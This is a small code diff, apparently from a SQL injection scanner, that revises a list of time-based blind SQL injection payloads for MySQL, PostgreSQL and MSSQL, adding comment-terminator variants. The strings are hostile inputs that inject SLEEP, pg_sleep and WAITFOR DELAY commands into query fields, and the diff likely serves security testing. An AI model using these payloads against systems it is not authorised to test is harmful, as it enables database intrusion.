@@ -20,11 +20,13 @@ ERROR_SIGNATURES = [
 ]
 
 TIME_PAYLOADS = [
-    "' AND SLEEP(3)--",
-    "' AND pg_sleep(3)--",
-    "'; WAITFOR DELAY '0:0:3'--",
-    "1 AND SLEEP(3)--",
-    "1; SELECT pg_sleep(3)--",
+    "' AND SLEEP(3)-- ",
+    "' AND SLEEP(3)#",
+    "' AND pg_sleep(3)-- ",
+    "'; WAITFOR DELAY '0:0:3'-- ",
+    "1 AND SLEEP(3)-- ",
+    "1 AND SLEEP(3)#",
+    "1; SELECT pg_sleep(3)-- ",
 ]
 
 ERROR_PAYLOADS = [
